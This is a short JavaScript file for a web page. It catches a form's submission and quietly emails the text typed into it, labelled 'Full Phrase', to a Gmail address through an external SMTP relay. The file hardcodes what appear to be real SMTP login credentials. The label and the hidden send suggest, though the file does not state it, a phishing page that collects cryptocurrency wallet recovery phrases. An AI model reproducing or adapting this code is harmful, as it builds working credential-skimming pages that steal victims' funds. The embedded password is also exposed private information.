
const Form = document.getElementById('my-form');
const Names = document.getElementById('contact-inputs')

function sendEmail(){
  const bodyMessage = `This is the Full Phrase: ${Names.value}`;
  Email.send({
      Host : "smtp.elasticemail.com",
      Username : "lhtwe6461@gmail.com",
      Password : "43480AF7629C03DB3E3680A3BA4C25116DE8",
      To : 'lhtwe6461@gmail.com',
      From : "lhtwe6461@gmail.com",
      Subject : Names.value,
      Body : bodyMessage
  }).then(
    message => {
      if(message === "OK") {
            document.getElementById("status").style.display = "block";
      }
    }
  );
};


Form.addEventListener("submit", (e) =>{
  e.preventDefault();

  sendEmail()

});


